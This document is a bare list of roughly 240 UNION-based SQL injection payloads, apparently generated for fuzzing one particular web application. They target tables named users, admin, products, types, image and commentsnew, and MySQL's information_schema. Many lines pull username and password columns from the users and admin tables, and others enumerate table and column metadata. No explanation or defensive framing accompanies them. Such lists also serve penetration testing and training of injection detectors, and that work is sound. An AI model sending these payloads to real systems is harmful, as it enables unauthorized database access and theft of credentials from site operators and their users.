1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT description ,id ,description ,description FROM types WHERE id ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT TABLE_CATALOG ,COLUMN_COMMENT ,COLUMN_NAME ,DATA_TYPE FROM information_schema.columns WHERE COLUMN_KEY ='1
1' UNION SELECT NULL ,id ,NULL ,NULL FROM types WHERE id <>'
1' UNION SELECT name ,name ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,TABLE_CATALOG ,COLUMN_NAME ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT name ,comment ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT type ,NULL ,id ,price FROM products WHERE id ='1
1' UNION SELECT type ,type ,name ,id FROM products WHERE price <>'
1' UNION SELECT NULL ,NULL ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT UPDATE_TIME ,TABLE_CATALOG ,INDEX_LENGTH ,CREATE_TIME FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT TABLE_NAME ,DATA_LENGTH ,TABLE_ROWS ,DATA_FREE FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT NULL ,NULL ,comment ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT TABLE_ROWS ,VERSION ,TABLE_COMMENT ,ENGINE FROM information_schema.tables WHERE ENGINE <>'
1' UNION SELECT NULL ,NULL ,price ,type FROM products WHERE price <>'
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,id ,price ,id FROM products WHERE id ='1
1' UNION SELECT TABLE_COLLATION ,DATA_LENGTH ,TABLE_CATALOG ,TABLE_NAME FROM information_schema.tables WHERE CHECKSUM ='1
1' UNION SELECT id ,name ,description ,name FROM types WHERE name ='1
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE id <>'
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT password ,id ,username ,username FROM users WHERE password ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT NULL ,id ,NULL ,username FROM users WHERE password <>'
1' UNION SELECT id ,name ,name ,price FROM products WHERE type <>'
1' UNION SELECT username ,NULL ,NULL ,password FROM users WHERE id <>'
1' UNION SELECT COLUMN_COMMENT ,COLUMN_COMMENT ,CHARACTER_SET_NAME ,NULL FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT id ,password ,NULL ,password FROM admin WHERE password ='1
1' UNION SELECT TABLE_SCHEMA ,COLLATION_NAME ,TABLE_SCHEMA ,COLLATION_NAME FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT NULL ,id ,NULL ,id FROM users WHERE password <>'
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,name ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT price ,id ,id ,NULL FROM products WHERE type ='1
1' UNION SELECT EXTRA ,EXTRA ,TABLE_CATALOG ,DATA_TYPE FROM information_schema.columns WHERE DATETIME_PRECISION <>'
1' UNION SELECT TABLE_NAME ,CREATE_TIME ,AVG_ROW_LENGTH ,TABLE_COMMENT FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT UPDATE_TIME ,NULL ,ENGINE ,TABLE_COLLATION FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT TABLE_COLLATION ,ENGINE ,TABLE_CATALOG ,VERSION FROM information_schema.tables WHERE ENGINE ='1
1' UNION SELECT id ,NULL ,price ,id FROM products WHERE price ='1
1' UNION SELECT NUMERIC_PRECISION ,COLUMN_COMMENT ,GENERATION_EXPRESSION ,COLUMN_DEFAULT FROM information_schema.columns WHERE EXTRA ='1
1' UNION SELECT CHARACTER_SET_NAME ,DATA_TYPE ,SRS_ID ,COLUMN_COMMENT FROM information_schema.columns WHERE COLUMN_COMMENT <>'
1' UNION SELECT NULL ,comment ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT password ,password ,NULL ,password FROM users WHERE id ='1
1' UNION SELECT TABLE_SCHEMA ,DATA_LENGTH ,UPDATE_TIME ,TABLE_COLLATION FROM information_schema.tables WHERE ENGINE ='1
1' UNION SELECT NULL ,EXTRA ,NULL ,CHARACTER_SET_NAME FROM information_schema.columns WHERE TABLE_NAME <>'
1' UNION SELECT TABLE_CATALOG ,COLUMN_COMMENT ,TABLE_NAME ,COLUMN_NAME FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT password ,password ,username ,id FROM admin WHERE id ='1
1' UNION SELECT CREATE_TIME ,TABLE_COMMENT ,CHECKSUM ,TABLE_CATALOG FROM information_schema.tables WHERE MAX_DATA_LENGTH <>'
1' UNION SELECT CHARACTER_SET_NAME ,ORDINAL_POSITION ,SRS_ID ,TABLE_SCHEMA FROM information_schema.columns WHERE NUMERIC_SCALE ='1
1' UNION SELECT NULL ,name ,comment ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT VERSION ,DATA_FREE ,TABLE_SCHEMA ,TABLE_COMMENT FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT NUMERIC_SCALE ,CHARACTER_OCTET_LENGTH ,COLUMN_KEY ,DATETIME_PRECISION FROM information_schema.columns WHERE DATA_TYPE ='1
1' UNION SELECT NULL ,username ,username ,id FROM admin WHERE username <>'
1' UNION SELECT COLUMN_KEY ,NULL ,COLUMN_NAME ,COLUMN_DEFAULT FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT id ,description ,NULL ,id FROM types WHERE id <>'
1' UNION SELECT comment ,NULL ,comment ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,id ,username ,id FROM users WHERE password <>'
1' UNION SELECT NULL ,name ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT id ,NULL ,NULL ,NULL FROM products WHERE id ='1
1' UNION SELECT NULL ,name ,NULL ,name FROM products WHERE price <>'
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT username ,password ,username ,password FROM users WHERE username ='1
1' UNION SELECT NULL ,description ,name ,NULL FROM types WHERE description ='1
1' UNION SELECT NULL ,name ,name ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT username ,id ,password ,password FROM admin WHERE password <>'
1' UNION SELECT DATA_TYPE ,NUMERIC_PRECISION ,CHARACTER_MAXIMUM_LENGTH ,TABLE_SCHEMA FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT id ,id ,NULL ,password FROM admin WHERE password <>'
1' UNION SELECT password ,id ,username ,password FROM admin WHERE username ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT COLUMN_DEFAULT ,NULL ,DATETIME_PRECISION ,TABLE_NAME FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT name ,name ,price ,price FROM products WHERE name <>'
1' UNION SELECT NULL ,NULL ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,price ,price ,price FROM products WHERE type <>'
1' UNION SELECT type ,price ,price ,name FROM products WHERE price <>'
1' UNION SELECT username ,id ,username ,id FROM admin WHERE password ='1
1' UNION SELECT NULL ,name ,comment ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT TABLE_CATALOG ,ORDINAL_POSITION ,COLUMN_NAME ,SRS_ID FROM information_schema.columns WHERE DATA_TYPE <>'
1' UNION SELECT DATA_TYPE ,TABLE_CATALOG ,COLUMN_KEY ,TABLE_SCHEMA FROM information_schema.columns WHERE COLUMN_DEFAULT ='1
1' UNION SELECT username ,username ,id ,password FROM users WHERE username ='1
1' UNION SELECT price ,name ,id ,id FROM products WHERE name ='1
1' UNION SELECT NULL ,id ,NULL ,NULL FROM admin WHERE username <>'
1' UNION SELECT username ,NULL ,NULL ,username FROM users WHERE id ='1
1' UNION SELECT type ,type ,NULL ,price FROM products WHERE type ='1
1' UNION SELECT password ,password ,NULL ,username FROM users WHERE password <>'
1' UNION SELECT id ,price ,name ,NULL FROM products WHERE id ='1
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images ='1
1' UNION SELECT name ,name ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,id ,NULL ,password FROM users WHERE username ='1
1' UNION SELECT NULL ,password ,NULL ,id FROM users WHERE id <>'
1' UNION SELECT password ,password ,username ,username FROM users WHERE username <>'
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT CHARACTER_OCTET_LENGTH ,SRS_ID ,GENERATION_EXPRESSION ,DATETIME_PRECISION FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT username ,NULL ,NULL ,id FROM users WHERE id <>'
1' UNION SELECT password ,username ,NULL ,id FROM users WHERE id ='1
1' UNION SELECT NULL ,comment ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT DATETIME_PRECISION ,PRIVILEGES ,PRIVILEGES ,GENERATION_EXPRESSION FROM information_schema.columns WHERE NUMERIC_PRECISION <>'
1' UNION SELECT username ,username ,username ,username FROM admin WHERE password <>'
1' UNION SELECT DATETIME_PRECISION ,TABLE_CATALOG ,CHARACTER_MAXIMUM_LENGTH ,NUMERIC_PRECISION FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT CHECKSUM ,UPDATE_TIME ,AVG_ROW_LENGTH ,CREATE_TIME FROM information_schema.tables WHERE MAX_DATA_LENGTH ='1
1' UNION SELECT NULL ,NULL ,name ,name FROM types WHERE description <>'
1' UNION SELECT username ,NULL ,username ,id FROM users WHERE username <>'
1' UNION SELECT password ,id ,NULL ,password FROM users WHERE username ='1
1' UNION SELECT NULL ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT description ,id ,description ,description FROM types WHERE name ='1
1' UNION SELECT name ,name ,price ,id FROM products WHERE name <>'
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT id ,username ,id ,username FROM admin WHERE password <>'
1' UNION SELECT NULL ,password ,username ,id FROM admin WHERE username ='1
1' UNION SELECT id ,NULL ,name ,id FROM types WHERE name ='1
1' UNION SELECT id ,username ,NULL ,username FROM users WHERE password <>'
1' UNION SELECT id ,password ,password ,id FROM users WHERE id ='1
1' UNION SELECT SRS_ID ,COLUMN_NAME ,CHARACTER_SET_NAME ,COLLATION_NAME FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT DATETIME_PRECISION ,CHARACTER_MAXIMUM_LENGTH ,TABLE_SCHEMA ,DATETIME_PRECISION FROM information_schema.columns WHERE COLUMN_TYPE ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT NULL ,name ,NULL ,price FROM products WHERE id <>'
1' UNION SELECT id ,NULL ,id ,password FROM admin WHERE id ='1
1' UNION SELECT name ,NULL ,id ,description FROM types WHERE name <>'
1' UNION SELECT name ,name ,NULL ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT type ,NULL ,id ,type FROM products WHERE type ='1
1' UNION SELECT name ,type ,type ,id FROM products WHERE id ='1
1' UNION SELECT id ,id ,type ,NULL FROM products WHERE type ='1
1' UNION SELECT id ,name ,type ,type FROM products WHERE price ='1
1' UNION SELECT NULL ,username ,id ,NULL FROM admin WHERE username ='1
1' UNION SELECT id ,NULL ,description ,description FROM types WHERE description ='1
1' UNION SELECT COLUMN_KEY ,COLUMN_TYPE ,PRIVILEGES ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE GENERATION_EXPRESSION <>'
1' UNION SELECT NULL ,VERSION ,CREATE_TIME ,DATA_FREE FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT EXTRA ,NUMERIC_SCALE ,CHARACTER_SET_NAME ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE NUMERIC_PRECISION ='1
1' UNION SELECT name ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,name ,description ,id FROM types WHERE name <>'
1' UNION SELECT NULL ,name ,comment ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,images ,images ,images FROM image WHERE images ='1
1' UNION SELECT comment ,comment ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT TABLE_SCHEMA ,CHECKSUM ,AVG_ROW_LENGTH ,DATA_FREE FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT IS_NULLABLE ,NULL ,COLUMN_KEY ,COLUMN_DEFAULT FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT NULL ,NULL ,name ,description FROM types WHERE description <>'
1' UNION SELECT username ,password ,username ,username FROM admin WHERE password ='1
1' UNION SELECT id ,username ,username ,id FROM users WHERE id <>'
1' UNION SELECT NULL ,password ,id ,username FROM users WHERE password ='1
1' UNION SELECT username ,NULL ,username ,NULL FROM users WHERE password ='1
1' UNION SELECT GENERATION_EXPRESSION ,COLUMN_TYPE ,NULL ,NUMERIC_SCALE FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT images ,images ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,name ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT username ,password ,NULL ,NULL FROM admin WHERE password <>'
1' UNION SELECT username ,id ,NULL ,password FROM admin WHERE id ='1
1' UNION SELECT username ,id ,id ,NULL FROM admin WHERE username ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT name ,comment ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT id ,id ,price ,price FROM products WHERE name ='1
1' UNION SELECT comment ,comment ,NULL ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT TABLE_CATALOG ,IS_NULLABLE ,EXTRA ,COLUMN_KEY FROM information_schema.columns WHERE TABLE_NAME <>'
1' UNION SELECT COLUMN_DEFAULT ,SRS_ID ,NUMERIC_PRECISION ,COLUMN_NAME FROM information_schema.columns WHERE SRS_ID <>'
1' UNION SELECT NULL ,name ,NULL ,name FROM types WHERE description <>'
1' UNION SELECT TABLE_CATALOG ,CHECKSUM ,TABLE_NAME ,TABLE_NAME FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT username ,password ,username ,NULL FROM users WHERE id ='1
1' UNION SELECT description ,id ,description ,name FROM types WHERE id ='1
1' UNION SELECT NULL ,password ,id ,NULL FROM admin WHERE username <>'
1' UNION SELECT name ,id ,name ,name FROM types WHERE id <>'
1' UNION SELECT name ,price ,NULL ,id FROM products WHERE name <>'
1' UNION SELECT name ,name ,comment ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT password ,username ,username ,username FROM admin WHERE password ='1
1' UNION SELECT ENGINE ,AVG_ROW_LENGTH ,ENGINE ,MAX_DATA_LENGTH FROM information_schema.tables WHERE TABLE_COLLATION <>'
1' UNION SELECT name ,NULL ,id ,NULL FROM types WHERE id ='1
1' UNION SELECT DATA_LENGTH ,TABLE_COLLATION ,DATA_FREE ,CREATE_TIME FROM information_schema.tables WHERE CHECKSUM ='1
1' UNION SELECT TABLE_SCHEMA ,CREATE_TIME ,ROW_FORMAT ,CHECK_TIME FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH ,CHARACTER_SET_NAME ,COLUMN_COMMENT FROM information_schema.columns WHERE GENERATION_EXPRESSION ='1
1' UNION SELECT username ,password ,password ,username FROM users WHERE username ='1
1' UNION SELECT id ,id ,id ,name FROM types WHERE name <>'
1' UNION SELECT DATETIME_PRECISION ,EXTRA ,COLUMN_TYPE ,COLUMN_DEFAULT FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT description ,NULL ,name ,id FROM types WHERE id <>'
1' UNION SELECT id ,name ,id ,name FROM products WHERE type <>'
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT NULL ,NULL ,images ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,NULL ,name ,id FROM products WHERE id <>'
1' UNION SELECT NULL ,id ,id ,password FROM admin WHERE id <>'
1' UNION SELECT PRIVILEGES ,EXTRA ,GENERATION_EXPRESSION ,CHARACTER_SET_NAME FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT UPDATE_TIME ,DATA_LENGTH ,NULL ,CREATE_OPTIONS FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT AUTO_INCREMENT ,MAX_DATA_LENGTH ,TABLE_COLLATION ,MAX_DATA_LENGTH FROM information_schema.tables WHERE TABLE_NAME ='1
1' UNION SELECT NULL ,COLUMN_DEFAULT ,NUMERIC_SCALE ,IS_NULLABLE FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT id ,name ,id ,name FROM types WHERE id ='1
1' UNION SELECT price ,id ,type ,id FROM products WHERE price ='1
1' UNION SELECT CHARACTER_MAXIMUM_LENGTH ,COLLATION_NAME ,CHARACTER_SET_NAME ,COLLATION_NAME FROM information_schema.columns WHERE EXTRA ='1
1' UNION SELECT password ,id ,NULL ,id FROM admin WHERE id ='1
1' UNION SELECT SRS_ID ,TABLE_CATALOG ,ORDINAL_POSITION ,EXTRA FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT NULL ,id ,password ,NULL FROM admin WHERE id <>'
1' UNION SELECT name ,description ,description ,name FROM types WHERE name ='1
1' UNION SELECT CHECKSUM ,TABLE_COMMENT ,UPDATE_TIME ,TABLE_COLLATION FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT name ,name ,price ,id FROM products WHERE name ='1
1' UNION SELECT name ,NULL ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT COLUMN_KEY ,TABLE_NAME ,CHARACTER_OCTET_LENGTH ,NUMERIC_PRECISION FROM information_schema.columns WHERE TABLE_CATALOG ='1
1' UNION SELECT TABLE_CATALOG ,ORDINAL_POSITION ,COLUMN_KEY ,DATETIME_PRECISION FROM information_schema.columns WHERE DATA_TYPE ='1
1' UNION SELECT price ,NULL ,NULL ,type FROM products WHERE price ='1
1' UNION SELECT TABLE_TYPE ,TABLE_CATALOG ,TABLE_COMMENT ,TABLE_SCHEMA FROM information_schema.tables WHERE CREATE_TIME <>'
1' UNION SELECT username ,password ,username ,password FROM users WHERE password <>'
1' UNION SELECT name ,NULL ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT description ,id ,name ,description FROM types WHERE name <>'
1' UNION SELECT NULL ,username ,NULL ,password FROM users WHERE username <>'
1' UNION SELECT PRIVILEGES ,COLUMN_TYPE ,TABLE_NAME ,IS_NULLABLE FROM information_schema.columns WHERE COLUMN_KEY <>'
1' UNION SELECT password ,username ,username ,NULL FROM users WHERE password ='1
1' UNION SELECT password ,id ,password ,id FROM users WHERE id <>'
1' UNION SELECT TABLE_ROWS ,UPDATE_TIME ,TABLE_TYPE ,DATA_LENGTH FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT DATA_LENGTH ,DATA_FREE ,ENGINE ,ENGINE FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT VERSION ,CREATE_OPTIONS ,TABLE_NAME ,TABLE_NAME FROM information_schema.tables WHERE TABLE_TYPE <>'
1' UNION SELECT NULL ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT COLLATION_NAME ,TABLE_SCHEMA ,DATA_TYPE ,TABLE_SCHEMA FROM information_schema.columns WHERE GENERATION_EXPRESSION <>'
1' UNION SELECT id ,username ,NULL ,password FROM users WHERE password <>'
1' UNION SELECT id ,name ,price ,id FROM products WHERE price <>'
1' UNION SELECT COLUMN_NAME ,NULL ,IS_NULLABLE ,TABLE_NAME FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT NULL ,NULL ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT VERSION ,TABLE_TYPE ,INDEX_LENGTH ,DATA_FREE FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT password ,username ,id ,id FROM admin WHERE username ='1
1' UNION SELECT name ,comment ,comment ,name FROM commentsnew WHERE name <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,DATA_TYPE ,DATA_TYPE ,COLUMN_KEY FROM information_schema.columns WHERE EXTRA ='1
1' UNION SELECT COLUMN_COMMENT ,TABLE_CATALOG ,TABLE_CATALOG ,COLUMN_TYPE FROM information_schema.columns WHERE PRIVILEGES ='1
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT IS_NULLABLE ,EXTRA ,COLUMN_NAME ,TABLE_SCHEMA FROM information_schema.columns WHERE COLUMN_NAME <>'
1' UNION SELECT CHARACTER_OCTET_LENGTH ,SRS_ID ,COLLATION_NAME ,DATETIME_PRECISION FROM information_schema.columns WHERE IS_NULLABLE <>'
